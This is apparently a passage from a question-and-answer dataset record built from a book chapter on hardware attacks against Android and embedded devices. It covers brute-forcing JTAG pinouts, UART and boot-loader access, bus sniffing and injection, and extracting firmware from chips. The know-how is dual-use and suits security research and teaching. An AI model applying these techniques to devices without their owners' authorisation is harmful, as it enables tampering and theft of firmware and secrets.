/dev/tty.usbserial-A901KKFM\n[s7ephen@xip ~]$ screen /dev/tty.usbserial-A901KKFM 115200\nWhen connected to the device, you are greeted with a friendly interactive\nCLI that displays the creator and fi rmware version:\nJTAGulator 1.1\nDesigned by Joe Grand [joe@grandideastudio.com]\n: :\n?\nc13.indd 08:24:56:AM 03/04/2014 Page 453\n454 Chapter 13 ■ Hardware Attacks\n:\nJTAG Commands:\nI Identify JTAG pinout (IDCODE Scan)\nB Identify JTAG pinout (BYPASS Scan)\nD Get Device ID(s)\nT Test BYPASS (TDI to TDO)\nUART Commands:\nU Identify UART pinout\nP UART pass through\nGeneral Commands:\nV Set target system voltage (1.2V to 3.3V)\nR Read all channels (input)\nW Write all channels (output)\nH Print available commands\n:\nPress the H key to display interactive help.\nNOTE As of fi rmware version 1.1, the JTAGulator does not echo key presses, so\nyou’ll need to turn on Local Echo in your terminal program if you use that version.\nJoe Grand has posted videos and documentation on the web in which he uses\nthe JTAGulator to brute force the JTAG pinouts of a Blackberry 7290 cellular\nphone. Still, any device with JTAG pins can be targeted with the JTAGulator.\nFor demonstrative purposes, we chose an Android-based HTC Dream and a\nLuminary Micro LM3S8962 ARM Evaluation Board. To interface with the (very\ndiffi cult to reach) JTAG pins of an HTC Dream we purchased a special adapter\nfrom Multi-COM, a Polish company that makes debug cables, adapters, and\nother low-level devices for mobile phones. After all your suspected pins are\nconnected from the target to the JTAGulator, you select a target voltage, which\nis the voltage that the device uses for operating the JTAG pins. You can either\nguess the voltage or fi nd it in the specifi cations of your target processor. The\nstandard for most chips is to operate at 3.3 volts. The V command enables you\nto set this parameter:\nCurrent target voltage: Undefined\nEnter new target voltage (1.2 - 3.3, 0 for off): 3.3\nNew target voltage set!\n:\nWhen that is done, it is quickest to begin with an IDCODE scan because it\ntakes less time to perform than a BYPASS (Boundary Check) scan. IDCODE\nscans are written into the JTAG SWD standard as a means for a JTAG slave (in\nc13.indd 08:24:56:AM 03/04/2014 Page 454\nChapter 13 ■ Hardware Attacks 455\nthis case the target device/processor) to quickly identify itself to a JTAG master\n(in this case our JTAGulator).\nThe JTAGulator quickly iterates through the possible pin combinations initiating\nthis rudimentary communication. If the JTAGulator gets a response, it records\nwhat pin confi gurations yielded a response from the device. Consequently, it\nis able to determine which pins provide which JTAG functions.\nTo perform this against an HTC Dream, initiate an IDCODE scan using the I\ncommand. Tell the JTAGulator which of its pins we connected with suspected\nJTAG pins:\nEnter number of channels to use (3 - 24): 19\nEnsure connections are on CH19..CH0.\nPossible permutations: 6840\nPress spacebar to begin (any other key to abort)...\nJTAGulating! Press any key to abort...\nTDI: N/A\nTDO: 4\nTCK: 7\nTMS: 5\nIDCODE scan complete!\n:\nThe JTAGulator then displays all the possible combinations of pinouts it will try\nand initiates brute forcing at your command. Almost instantly it gets responses,\nidentifying which pin confi gurations yielded IDCODE scan responses. You can\nnow connect these corresponding pins into your J-Link or other JTAG debugger\nand begin debugging the target device!\nConnecting to Custom UARTs\nMany cell phones, including Android devices, expose some form of UART\nthrough the use of a nonstandard cable. These cables are often called jigs. The\nname comes from metalworking and woodworking, where it means a custom\ntool crafted to help complete a task. You can fi nd more information on jigs for\nSamsung devices, including the Galaxy Nexus, in the XDA-Developers forum\nat http://forum.xda-developers.com/showthread.php?t=1402286. More\ninformation on building a UART cable for the Nexus 4 which uses the device’s\nheadphone jack, is at http://blog.accuvantlabs.com/blog/jdryan/building-\nnexus-4-uart-debug-cable. Using these custom cables enables access to UART,\nwhich can also be used to achieve interactive kernel debugging as shown in\nChapter 10.\nc13.indd 08:24:56:AM 03/04/2014 Page 455"
  },
  {
    "input": "How can you identify and access the specifications of components on a PCB, and what are the common methods used to obtain firmware images from devices?",
    "summary": "Hardware attacks involve identifying components on a PCB by searching for serial numbers, test points, or other identifiers online. Tools like the Total Phase USB analyzer and the Bus Pirate can be used to monitor and interact with communication interfaces such as USB, I2C, SPI, and UART. Additionally, techniques like desoldering and using devices like the Xeltek SuperPro 5000E allow for the extraction of firmware from chips. Reverse engineering firmware often requires tools like IDA Pro and techniques such as using FLIRT signatures to identify compiler-specific patterns. Challenges include dealing with custom interfaces, proprietary protocols, and obscured firmware access, which may require advanced methods or hardware modifications to overcome.",
    "output": "456 Chapter 13 ■ Hardware Attacks\nIdentifying Components\nIn previous sections there was mention of using specifi cation sheets on target\nprocessors and devices to obtain information, but little mention was made\nregarding how you might go about acquiring these specifi cations. Virtually\nevery IC (integrated circuit) chip generally has alphanumeric strings printed\non the top surface. If you are interested, you can fi nd many Internet resources\nthat give excruciating detail about the format of those strings. The important\nthing to you as a reverse engineer or vulnerability researcher is that using a\nsearch engine enables you to quickly get information about what a chip does.\nSearching for components on the Internet generally returns the manufacturer’s\nwebsite or the datasheets of large distributors, such as Digi-Key and Mouser\nElectronics. The websites of the distributors are quite useful because they gener-\nally summarize what the component is and the purpose it serves. Further, they\noften provide the datasheets for the products they distribute.\nGetting Specifi cations\nAlthough the general description of a component is useful for quickly deter-\nmining its purpose on a PCB, sometimes you need a bit more information, such\nas the placement and location of important pins. For example, many PCBs will\n(for debugging purposes) connect a pin from an IC to an open hole. These open\nholes are called test points.\nAs an aside, test points are generally just that: small holes in the PCB that\ngive an engineer test access to that line. Test points or test pads are the most com-\nmon ways to expose lines. However, they are not as convenient as pin headers\nprotruding from the board. In earlier examples, we connected to unknown pins\non a PCB via these overt pin headers. Hardware hacker Travis Goodspeed’s\ntechnique for interfacing with these pins is rather novel. He uses hypodermic\nsyringes, which are extremely sharp and conductive pieces of metal (the syringe)\nconnected to an easy to manipulate handle (the plunger). An example of this\ntechnique in action is shown in Figure 13-27.\nUsing this technique you can get precise access to a test pad or test point.\nYou can clip your probes or devices to the metal of the syringe instead of cum-\nbersomely soldering to test points that are often close together or otherwise in\nspace-constrained positions.\nNonetheless, identifying the test points around a processor or IC can be a\ngood fi rst start. However, when tracing these connections back to pins on an\nIC, you need to know what those pins on the chip are. Pulling the specifi cation\nsheets for an IC helps identify those pins.\nIn specifi cation sheets, generally there are diagrams of the basic chip layout.\nIn the event that there aren’t, ICs generally have identifying notches or cut\nc13.indd 08:24:56:AM 03/04/2014 Page 456\nChapter 13 ■ Hardware Attacks 457\ncorners that identify which pin is pin 1 or pin 0. Figure 13-28 shows a few dif-\nferent possibilities.\nHypodermic\nSyringe\nClock Pin\nSPI data pins as\n“Test Points”\nFigure 13-27: Goodspeed’s syringe technique\nCut-Off Corner Spot Cut-Off Corner\n144 64 49\n1413121011 9 8\n7 39 1 48\nNotch\nWRITING THIS\nWAY UP\nSpot PLCC\n1 2 3 4 5 6 7\nPQFP/MQFP\nDIL\n6 33\n17 32\n16 33\nALL VIEWED FROM ABOVE 17 32\nFigure 13-28: Finding pin 1\nDiffi culty Identifying Components\nThere are some cases when identifying components on a PCB can be diffi cult.\nIn some cases, vendors cover the chip in epoxy or remove the silkscreen print-\ning. In rare cases, some manufacturers—specifi cally CPU or microprocessor\nmanufacturers—print “SECRET” or a project code name on an IC. Thankfully,\nthese cases are very rare and seldom seen in consumer electronics.\nc13.indd 08:24:56:AM 03/04/2014 Page 457\n458 Chapter 13 ■ Hardware Attacks\nPackage on Package\nOne common obfuscation technique is something referred to in the industry as\nPackage on Package (PoP) confi gurations. These are generally used by manu-\nfacturers to sandwich components together to save real-estate space on the\nPCB. Instead of positioning a component adjacent to a processor on the PCB\nand running interface lines to it, the manufacturers instead build vertically and\nput the component on top of the CPU. They then sell it as a package that can be\npurchased in different confi gurations by the device manufacturer. Figure 13-29\nillustrates one potential PoP confi guration.\nFlash Memory SDRAM\nFigure 13-29: Package on Package\nThis practice is most commonly used (in our experience) with microprocessors\nand memory. Instead of putting a bank of fl ash memory horizontally adjacent\nto a CPU, some manufacturers use a PoP confi guration. In this case, the only\nvisible serial number is that of the memory atop the processor. In these cases,\ndoing an Internet search for that serial number does not yield the specifi cations\nfor what you’d expect (the microprocessor).\nThe solution to this can depend on the device. Sometimes the manufacturer\nof the visible device is the same as the manufacturer for the device underneath\nit. Sometimes a specifi cation sheet for the top device yields a number of com-\npatible devices that could be packaged with it. There is no one solution in this\ncase, and it takes some sleuthing to fi nd the name of the hidden device. In some\ncases, you can fi nd third-party information — such as details about tear-downs\nperformed by other technology enthusiasts — that can yield information for\ncommon consumer devices.\nc13.indd 08:24:56:AM 03/04/2014 Page 458\nChapter 13 ■ Hardware Attacks 459\nIntercepting, Monitoring, and Injecting Data\nIntercepting data or observing the device under its normal operating conditions\nis a staple of vulnerability research for both software and hardware. Ultimately\nthe goal is to observe data streams that you can either corrupt, tamper with,\nmalform, or play back to affect some vulnerability in the target. Hardware\nvulnerability research is no different.\nIn fact, in most cases these kinds of attacks are more fruitful in embedded\nsystems as most fi rmware developers or embedded developers assume that the\nhardware barrier to entry is too high. However, it’s common that the fi rmware\nor embedded developer doesn’t even conceive of the data being malformed as\nhe often writes the software on both sides of the conversation (be it a driver or\nanother component). Frequently no care is taken to sanity-check input values.\nThis is often an oversight or merely a speed optimization.\nThis section briefl y describes some of the tools that can be used to observe\ndata on various communications lines found in embedded devices. First, it\ncovers methods used for USB, because it is often exposed externally. Then the\ndiscussion turns to techniques for monitoring the less often exposed I2C, SPI,\nand UART communications.\nUSB\nUSB is perhaps the most common device interface around. It is used in virtu-\nally every mobile device and embedded device. Every Android device has an\nexposed USB port. Perhaps because of its ubiquity, it is also very misunderstood.\nThe USB protocol is quite complex; so for the purposes of brevity this section\nonly delves into some high-level parts of it.\nAn outstanding resource for dissecting and understanding the USB protocol\nis USB Complete: The Developer’s Guide by Jan Axelson. Even if you don’t intend\nto understand USB in its entirety, this publication is highly recommended if\nonly for the fi rst few illuminating chapters. The fi rst few chapters succinctly\nintroduce you to the different facets of USB, such as the transfer modes, versions,\nand speeds. Due to the way we often use USB as a point-to-point interface, we\nlose sight of the fact that USB is actually a network with a multitude of devices\nand hosts able to communicate along the same bus. An electronic version of the\nbook will make searching much easier should you choose to use it as a resource\nlater during your research.\nWith this book as a reference, you can comfortably begin dissecting or analyz-\ning USB traffi c. But what tools can you use to observe USB devices in the wild?\nc13.indd 08:24:56:AM 03/04/2014 Page 459\n460 Chapter 13 ■ Hardware Attacks\nSniffi ng USB\nThere are a number of devices available on the market that you can use as USB\ndebuggers or protocol analyzers. Perhaps the best of them all are those made by\nTotal Phase. Total Phase manufactures a number of wire-line protocol analyz-\ners, including ones for SPI, CAN, I2C, and more. While we will discuss these\nlater, Total Phase’s USB analyzers are the best on the market. Total Phase makes\nseveral USB protocol analyzers at several different price points. All their devices\n(including the non-USB analyzers) use a common software suite called Total\nPhase Data Center. Each device varies in price and capabilities, with the main\ndifferences in capability being the speed of the USB bus that it can analyze. The\nmore expensive devices can do fully passive monitoring of USB SuperSpeed 3.0\ndevices; the middle-tier devices can monitor USB 2.0; and the least expensive\ndevices are only capable of monitoring USB 1.0.\nAt a high-level, the USB specifi cation makes a distinction between things as\neither USB hosts or devices. This distinction is made within the USB controllers.\nUSB hosts generally consist of larger devices such as desktop computers and\nlaptops. USB devices are generally smaller devices — thumb drives, external\nhard-drives, or mobile phones, for example. The difference between hosts and\ndevices becomes increasingly relevant in later sections. The Total Phase ana-\nlyzers sit in-line between the USB host and USB device to passively spy on the\ncommunication between the two.\nThe Total Phase Data Center application controls the Total Phase analyzer\nhardware via a USB cable. The user interface for the Data Center application is\npresented in Figure 13-30.\nFigure 13-30: Total Phase user interface\nc13.indd 08:24:56:AM 03/04/2014 Page 460\nChapter 13 ■ Hardware Attacks 461\nThis application is functionally equivalent to the well-known open source\nWireshark network monitoring tool, but it’s for USB. It enables you to record and\nview the protocol conversation, as well as dissect it and analyze it in a number\nof ways. Total Phase also exports an application programming interface (API)\nthat enables you to interact directly with their devices or software to perform\ncaptures, receive callbacks/triggers, and passively parse or manipulate data\nfrom the bus.\nIn addition to the power of all this, Data Center also includes many other\nfeatures, such as the ability to add comments in the data stream, online help\nfor references to USB protocol lingo, and amazingly useful visualization tools\nfor tracking and analyzing USB data as it fl ies across the bus. One such tool is\nBlock View, which enables you to view protocol data visualized in the protocol\npacket hierarchy of the USB protocol. Block View is shown in Figure 13-31.\nFigure 13-31: Total Phase Block View\nFor passively monitoring data on a USB bus, Total Phase takes the cake. It\ndoes virtually everything you could want to do with data you observe for any\nprotocol. However, when the time comes that you need to actively interface with\nUSB devices, the Total Phase tools are simply not designed to do that. They do\nnot do traffi c replay or packet injection of any kind.\nDepending on your target, you can go about this in several ways. The main\nway you choose to go about actively replaying or interfacing with USB devices\nat a low-level USB protocol level depends on your target and desired goal. All\nof these differences are rooted in whether you want to interface with the target\nas a USB host or a USB device. There are different ways to go about both.\nc13.indd 08:24:56:AM 03/04/2014 Page 461\n462 Chapter 13 ■ Hardware Attacks\nInterfacing with USB Devices as a USB Host\nPerhaps the easiest way to go about interfacing with a target is as a USB host.\nIf your target designates itself as a USB device (which can be observed with\npassive monitoring using a tool like the Total Phase) then you can use libusb\nto write custom code to speak to the device.\nlibusb is an open source library that gives the developer access to the USB-\nlevel protocol communications as a USB host. Instead of opening a raw USB\ndevice (via the /dev fi le system, for example), libusb provides wrappers for basic\nUSB communication. There are a number of bindings for libusb for common\nlanguages like Python and Ruby with varying levels of support across several\ndifferent versions of libusb.\nThere are quite a few examples available on the Internet of people using\nPyUSB or high-level languages to communicate with devices such as the Xbox\nKinect, human interface devices (or HIDs, such as keyboards and mice), and\nmore. Should you choose to go that route, libusb is popular enough that you\ncan generally search for and fi nd answers to simple questions.\nInterfacing with USB Hosts as a USB Device\nIn contrast to interfacing with USB devices, interfacing with USB hosts as a device\nis a much more complex issue. Because USB controllers declare themselves as\neither devices or hosts, you cannot easily tell the USB controller in your laptop or\ndesktop computer to simply pretend to be a USB device. Instead, you need some\nform of intermediary hardware. For many years, devices that performed this\nfunction were virtually nonexistent. Then, several years ago, Travis Goodspeed\nunveiled an open source hardware device he called the Facedancer. The PCB\nlayout of version 2.0 of the Facedancer appears in Figure 13-32. This device uses\nspecial fi rmware for the embedded MSP430 processor to accept data from a USB\nhost and proxy it to another USB host as a device.\nUnfortunately, version 2.0 of Facedancer had some simple circuit errors that\nwere corrected by Ryan M. Speers. Travis Goodspeed has since deprecated the\nFacedancer20 design and with Speer’s fi xes released the Facedancer21.\nThe Facedancer device is fully open source and the code repository for the\ndevice includes Python libraries that speak directly to the hardware via USB.\nDevelopers can then use those Python libraries to write programs that speak\nto other USB hosts (via the Facedancer) as if they were USB devices.\nThe Facedancer code includes several examples out of the box. One such\nexample is an HID (keyboard) that when plugged into a victim’s computer\nwill type messages to the victim’s screen as if she were using a USB keyboard.\nAnother example is a mass storage emulation, which allows a developer to\nc13.indd 08:24:56:AM 03/04/2014 Page 462\nChapter 13 ■ Hardware Attacks 463\nmount (albeit slowly) a disk image (or any fi le) from the controlling computer\nonto a victim’s computer as if it were a USB fl ash drive.\nFigure 13-32: Facedancer v2.0\nThe Facedancer started off as an electronics hobbyist project. Travis Goodspeed\nhad fabricated the PCB, but because assembly is a very expensive task to perform\nin bulk, it was up to the purchaser to acquire all the parts and solder it together.\nHowever, at the time of publishing, the INT3.CC website at http://int3.cc/\nsells fully assembled Facedancer21 units.\nThere are other devices that have since released that assist with low-level\nUSB development in the same way as the Facedancer. One such device is called\nSuperMUTT. It was created out of collaboration between VIALabs and Microsoft.\nThe device is intended to work with the Microsoft USB Test Tool (MUTT, hence\nthe name of the device). It claims to be able to simulate any device traffi c on the\nbus, and is apparently the preferred tool of USB developers.\nWhichever device you choose, it is now possible to programmatically simulate\na USB device where previously it required obscure hardware tools or custom\nhardware development.\nI2C, SPI, and UART Serial Interfaces\nEarlier in the chapter, we briefl y discussed I2C, SPI, and UART, describing some\nof the ways that they are commonly used in circuits. I2C and SPI are generally\nused for intra-circuit communication — that is, communication between ICs and\ncomponents in a system. In contrast, UART is generally used to interface with\nusers (interactively or as a debug interface) or larger peripherals such as modems.\nBut how might you intercept traffi c on these busses or inject data into them?\nc13.indd 08:24:56:AM 03/04/2014 Page 463\n464 Chapter 13 ■ Hardware Attacks\nSniffi ng I2C, SPI, and UART\nEarlier, when detailing how to fi nd UART pinouts, we introduced the use of\na logic analyzer to record traffi c on the bus. We mentioned that tools like the\nSaleae have software fi lters that can be used to intelligently guess what serial\nprotocol is being observed. In the earlier example, a UART analyzer was used to\nfi nd and decode the data output by mysterious pins exposed inside a Broadcom\ncable modem.\nThe Saleae performs analysis for I2C and SPI serial communications in much\nthe same way. However, there are other tools that can be used to observe traffi c\nspecifi cally on I2C and SPI ports.\nTotal Phase makes a relatively low cost USB-controlled device called the Beagle\nI2C that can observe and analyze I2C and SPI data. The Beagle uses the Data\nCenter application that was discussed earlier in this chapter in the “Sniffi ng\nUSB” section. The Data Center interface is more suited to protocol analysis than\nthat the interface Saleae Logic Analyzer, which simply observes square waves\nand guesses at protocols.\nIn Figure 13-33, the Total Phase Beagle was used to sniff the I2C pins of a\nVGA cable. Specifi cally, we intercepted the Extended Display Identifi cation Data\n(EDID) protocol exchange that happens between a video display and a video\ncard. In this case, the EDID data was intercepted as a monitor was plugged into\na computer via a custom-made video tap, which enabled us to access all pins in\na VGA cable while it was in use between a monitor and computer.\nFigure 13-33: Total Phase Beagle DVI cable\nc13.indd 08:24:56:AM 03/04/2014 Page 464\nChapter 13 ■ Hardware Attacks 465\nLike UART, SPI and I2C can run at various speeds, so it is important that you\nattempt to decode at the correct baud rate. Both the Saleae and Total Phase can\nguess the baud rate pretty accurately using the clock pins. However, there are\nsome small differences to note.\nI2C, unlike UART, is used to network multiple components that might live\non a PCB. Much like JTAG, each I2C device declares itself as either a master or\na slave. Each device connected to the I2C bus (when active) changes the voltage\non the overall I2C loop because it consumes the voltage causing an overall volt-\nage drop on the line. When all devices in the I2C chain are inactive, they act as\nif they are disconnected from the circuit. To keep the voltage draw on the I2C\nlines, I2C requires a pull-up resistor on the clock and data pins to keep the volt-\nage up even though a component in the chain is inactive. A “pull-up” resistor\ndoes exactly that; it “pulls” the voltage up to the expected levels.\nAs you might imagine, connecting a probe or analysis device (such as the\nBeagle) to an I2C bus might also change the voltage on the line. Consequently,\nwhen connecting an analysis tool to a line, you might need a pull-up resistor to\npull the voltage up to the correct level. Fortunately, many I2C analysis tools take\nthis into consideration and internally have pull-up resistors you can enable or\ndisable with software switches. This feature exists in the Beagle analysis tools\nas well as the Bus Pirate, which is covered in the next section.\nTalking to I2C, SPI, and UART devices\nSo how might you begin to interactively or programmatically speak to I2C, SPI,\nand UART devices? Perhaps the lowest cost method for this is to use a device\ncalled the Bus Pirate, which is shown in Figure 13-34.\nFigure 13-34: Bus Pirate v3\nc13.indd 08:24:56:AM 03/04/2014 Page 465\n466 Chapter 13 ■ Hardware Attacks\nThe Bus Pirate started off as a hobbyist device on the website Hack-A-Day\n(http://hackaday.com/), but quickly proved to be widely useful outside of the\nhobbyist community. It is extremely low cost, and you can buy it from a number\nof online retailers for around $30.\nMuch like the JTAGulator mentioned earlier, the Bus Pirate is a USB\ndevice that has a helpful CLI. You can access it using any terminal emulation\nprogram — such as PuTTY, Minicom, or GNU Screen — via a USB cable on a\nhost computer. The following excerpt shows the help screen that can be accessed\nusing the ? command:\n[s7ephen@xip ~]$ ls /dev/*serial*\n/dev/cu.usbserial-A10139BG /dev/tty.usbserial-A10139BG\n[s7ephen@xip ~]$ screen /dev/ tty.usbserial-A10139BG 115200HiZ>\nHiZ>?\nGeneral Protocol interaction\n---------------------------------------------------------------------------\n? This help (0) List current macros\n=X/|X Converts X/reverse X (x) Macro x\n~ Selftest [ Start\n# Reset ] Stop\n$ Jump to bootloader { Start with read\n&/% Delay 1 us/ms } Stop\na/A/@ AUXPIN (low/HI/READ) \"abc\" Send string\nb Set baudrate 123\nc/C AUX assignment (aux/CS) 0x123\nd/D Measure ADC (once/CONT.) 0b110 Send value\nf Measure frequency r Read\ng/S Generate PWM/Servo / CLK hi\nh Commandhistory \\ CLK lo\ni Versioninfo/statusinfo ^ CLK tick\nl/L Bitorder (msb/LSB) - DAT hi\nm Change mode _ DAT lo\no Set output type . DAT read\np/P Pullup resistors (off/ON) ! Bit read\ns Script engine : Repeat e.g. r:10\nv Show volts/states . Bits to read/write e.g. 0x55.2\nw/W PSU (off/ON) <x>/<x= >/<0> Usermacro x/assign x/list all\nHiZ>\nYou can connect the Bus Pirate to the target pins of your SPI, I2C, or UART\nbus using a convenient bundle of probes that plug directly into the Bus Pirate,\nas shown in Figure 13-35.\nUnlike the JTAGulator, which guesses pinouts, the Bus Pirate probes need\nto be connected to the target bus in specifi c confi gurations depending on what\nyou are targeting. You can use probe-color-coded Bus Pirate cheat sheets that\nare widely available on the Internet to make the Bus Pirate interface with SPI,\nI2C, and UART devices. For these interfaces, you need to tell the Bus Pirate some\ndetails, like baud rates (see Figure 13-36), which you can intelligently guess\nusing tools like the Saleae discussed earlier.\nc13.indd 08:24:56:AM 03/04/2014 Page 466\nChapter 13 ■ Hardware Attacks 467\nFigure 13-35: Bus Pirate probes\nFigure 13-36: Bus Pirate baud rate setting\nAfter it’s connected, the Bus Pirate enables you to interactively or passively\ncommunicate with the target bus. Because the Bus Pirate interface is text based,\nit does not have an easy way to observe binary data on these busses. The Bus\nPirate displays binary data by printing byte values (for example, 0x90). This is\nnot optimal for interacting with binary data streams. In many cases, people\nhave written their own software using libraries like PySerial to control the Bus\nPirate, receive its ASCII data stream, and convert the bytes they care about back\nto their literal byte values.\nc13.indd 08:24:56:AM 03/04/2014 Page 467\n468 Chapter 13 ■ Hardware Attacks\nTo fi ll this gap, Travis Goodspeed developed the GoodFET, which acts as a\nPython API–controlled Bus Pirate. It is (unlike the Facedancer21) available fully\nassembled from a number of retailers. Using the GoodFET, you can program-\nmatically interface with the busses you need to receive or transmit binary data\noutside the range of ASCII-printable characters.\nBoot Loaders\nAfter you have interactive connectivity to a device, the fi rst thing you may\nencounter when the device is reset is messages from the boot loader. Many boot\nloaders, such as Das U-Boot or U-Boot for short, allow you a small window of\ntime to press a key to enter an interactive boot loader menu. Figure 13-37 shows\na screenshot of such a prompt in U-Boot.\nFigure 13-37: U-Boot boot message\nThis case alone can often lead to complete compromise of a device because\nthe boot loaders often provide a plethora of functionality such as the following:\n■ Reading or writing to fl ash memory\n■ Booting from the network\n■ Upgrading or accepting new fi rmware via serial port\n■ Partitioning or manipulating fl ash fi le systems\nFigure 13-38 shows the full extent of the commands provided by a typical\nU-Boot deployment.\nc13.indd 08:24:56:AM 03/04/2014 Page 468\nChapter 13 ■ Hardware Attacks 469\nMany devices with accessible UART that make use of a boot loader like U-Boot\nwill often let you interactively drop into a session like this. If the manufacturer\ndid not think to disable UART, generally it also leaves U-Boot exposed.\nFigure 13-38: UBoot UART session\nStealing Secrets and Firmware\nHeretofore, we have discussed only methods of interfacing with and observing\ndata on communication paths between components or devices. Perhaps using\nall the previously mentioned techniques you begin fuzzing and observing\nexceptions or crashes. Or perhaps you don’t want to fuzz and simply want to\nimport a binary image into tools like (Interactive Disassembler) IDA to reverse\nengineer and audit for vulnerabilities.\nBut how do you access data embedded in other ways?\nAccessing Firmware Unobtrusively\nThere are many cases in which you can access and obtain fi rmware images\nfrom a device with fairly simple nondestructive techniques. The fi rst method\nrelies entirely on the kind of storage a device uses. In some rare cases, instead\nc13.indd 08:24:56:AM 03/04/2014 Page 469\n470 Chapter 13 ■ Hardware Attacks\nof a fi rmware image being stored to NAND or some other fl ash memory, it can\nbe squirreled away (often for backup) in Electrically Erasable Programmable\nRead-Only Memory (EEPROM).\nSPI EEPROM\nMuch like the SPI devices mentioned earlier in this chapter (accelerometers and\ntemperature sensors, for example), SPI EEPROM makes use of SPI. Where other\ntypes of memory use custom interfaces and “address lines” to fetch and store\ndata, SPI EEPROM uses a simple serial line to read and write data. The way\nthese kinds of storage devices work is simple. An address is written to the SPI\nor I2C bus (for example, 0x90) and the EEPROM device responds with the data\nthat is at that location. Figure 13-39 is a screenshot of the Total Phase Beagle\nobserving a device reading and writing from an I2C EEPROM.\nFigure 13-39: Total Phase Beagle I2C EEPROM\nIn the Transaction View near the top of the window you can clearly see that\neach Write Transaction is followed by a Read Transaction. The CPU wrote\nthe value 0x0013 to the I2C bus, and the I2C EEPROM responded with the value\nat that location, 0x68. In this way, reading these types of EEPROM is trivial. You\ncan spot these types of EEPROM simply by doing an Internet search for their\nserial numbers.\nc13.indd 08:24:56:AM 03/04/2014 Page 470\nChapter 13 ■ Hardware Attacks 471\nShould you want to do more than observe a CPU make use of this kind of\nEEPROM, Total Phase Data Center has additional functionality for reading data\ndirectly from SPI or I2C EEPROM automatically. Using this functionality, you\ncan reconstruct the binary data as a fi le on your local fi le system. You could\nalso conceivably use the Bus Pirate or GoodFET to perform the same function.\nMicroSD and SD Cards for Firmware Image Storage\nSome devices take fi rmware upgrades or store fi rmware images on MicroSD or\nSD cards. In the case where those storage devices make use of a mountable fi le\nsystem, it is merely a matter of unplugging and mounting the device in your\nanalysis computer. In some cases, embedded developers write the data raw, or\nin their own format, to the SD cards. Remembering that MicroSD and SD cards\nare inherently SPI, you can apply the same technique to the one described in\nthe preceding section for reading and writing from an SPI EEPROM.\nJTAG and Debuggers\nYou can use a JTAG debug interface or a debugger to inherently view contents\nof processor registers. In addition, you can often view the contents of memory.\nOn embedded systems, specifi cally those executing bare metal images, this\nmeans that you can consequently extract fi rmware. This is another reason that\ngaining JTAG debugger access to a device can be extremely advantageous. Many\ntools, such as the Segger J-Link, use the JTAG functionality to reconstruct the\nfi rmware image on the fi le system of the controlling computer. Using the GDB\nserver functionality for the J-Link, the GDB memory dump command often works\nfor dumping the entire contents of memory.\nDestructively Accessing the Firmware\nThere may be times where some of the previously described unobtrusive tech-\nniques are not possible. For these cases there are more obtrusive techniques.\nRemoving the Chip\nPerhaps the most obtrusive and destructive technique for obtaining a fi rmware\nimage is to physically remove the chip from the board and read it. At fi rst glance,\nthis may seem like a laborious and highly skilled technique. In reality, it is not.\nDe-soldering a surface mounted device (SMD) and reading it can be quite easy\nand fun. Some people use heat guns (which are essentially hot hair dryers) to\nc13.indd 08:24:56:AM 03/04/2014 Page 471\n472 Chapter 13 ■ Hardware Attacks\nsimultaneously melt all solder on the connections that bind a SMD component\nto a PCB. This is very effective and straightforward method.\nAnother technique is to use a product called Chip Quik. Kits, like the one\nshown in Figure 13-40, come with everything needed to apply this product.\nChip Quik is essentially composed of a metallic alloy that has a lower melting\ntemperature than traditional solder. Applying molten Chip Quik to solid/cooled\nsolder transfers heat to the solder and consequently melts it. Because the Chip\nQuik stays hotter longer, this enables you enough time to remove or de-solder\nchips from PCBs. Even if you are horrible at soldering, you can effectively apply\nChip Quik clumsily and have great success. There are many demonstration\nvideos on the Internet that describe the whole process.\nFigure 13-40: A Chip Quik kit\nAfter the target CPU or fl ash chip is de-soldered from the board, then what?\nFortunately, a company called Xeltek has built a family of useful devices that\nhelp with the next part: reading the chip. Xeltek offers a number of devices called\nUniversal Flash Programmers; their top-of-the-line devices are in the SuperPro\nline. The SuperPro devices can essentially read and write hundreds of different\nkinds of fl ash memory and processors. One such product is the Xeltek SuperPro\n5000E, which is shown in Figure 13-41.\nIn addition, Xeltek makes hundreds of adapters that fi t all the possible formats\nand form factors that chips may take. Figure 13-42 shows some of the adapters\nfor the SuperPro 5000E.\nc13.indd 08:24:56:AM 03/04/2014 Page 472\nChapter 13 ■ Hardware Attacks 473\nFigure 13-41: Xeltek SuperPro 5000E\nFigure 13-42: Xeltek SuperPro 5000E with adapters\nThe Xeltek website even has a searchable database in which you can enter a\nchip serial number to fi nd out which Xeltek adapter will fi t your target chip! The\nXeltek device itself plugs into a computer using a USB cable and the included\nsoftware is equally as simple to use. You simply start up the application, which\ndetects the adapter type you are using and asks you if you want to read it.\nc13.indd 08:24:56:AM 03/04/2014 Page 473\n474 Chapter 13 ■ Hardware Attacks\nClick Read and a few minutes later there is a binary fi le on your fi le system of\nthe contents of the chip! Figure 13-43 shows a screenshot of this tool in action.\nIt is literally that simple to rip the fi rmware out of chips. Priced at several\nthousand dollars, the Xeltek devices (like the advanced Total Phase USB tools)\nmay be prohibitively expensive if you don’t have a business need for them, but\nthey provide an incredibly useful and simple function.\nFigure 13-43: Xeltek firmware read\nWhat Do You Do with a Dump?\nSo maybe you have a big binary fi le you’ve managed to extract from a device\nusing some of the techniques mentioned previously. What next? How do you\nknow what you are looking at? Is the binary fi le just the fi rmware or is other\ndata intermingled?\nBare Metal Images\nAs mentioned earlier, microcontrollers blindly execute whatever it is they are\npointed at during boot. The specifi cations sheet for your target tells you exactly\nhow bootstrap works within the processor (where the entry point is, initial\nregister states, and so on). But maybe you just want to quickly know what you\nare looking at. Sometimes this might require walking through the fi le in a hex\neditor to glean clues about what is in the big binary blob.\nc13.indd 08:24:56:AM 03/04/2014 Page 474\nChapter 13 ■ Hardware Attacks 475\nIn many cases, the extracted fi rmware image is not just the fi rmware. It might\nalso include tiny fi le systems like CramFS, JFFS2, or Yaffs2. In cases where you\nextracted data from NAND fl ash, these binary blobs are likely to be strictly the\ntiny fi le systems. Tools like binwalk can detect these and provide a bit more\ninformation about the contents of a binary blob. binwalk uses heuristics to\nlocate recognizable structure in fi les. The following excerpt shows an example\nof using binwalk:\n[s7ephen@xip ~]$ binwalk libc.so\n/var/folders/jb/dlpdf3ns1slblcddnxs7glsc0000gn/T/tmpzP9ukC, 734:\nWarning: New continuation level 2 is more than one larger than current\nlevel 0\nDECIMAL HEX DESCRIPTION\n----------------------------------------------------------------------\n0 0x0 ELF 32-bit LSB shared object, ARM,\nversion 1 (SYSV)\n271928 0x42638 CramFS filesystem, little endian\nsize 4278867 hole_support CRC 0x2f74656b, edition 1886351984,\n2037674597 blocks, 1919251295 files\nIn this simplifi ed example, we execute binwalk on libc.so extracted from an\nAndroid device. You can see it correctly identifi es the contents of 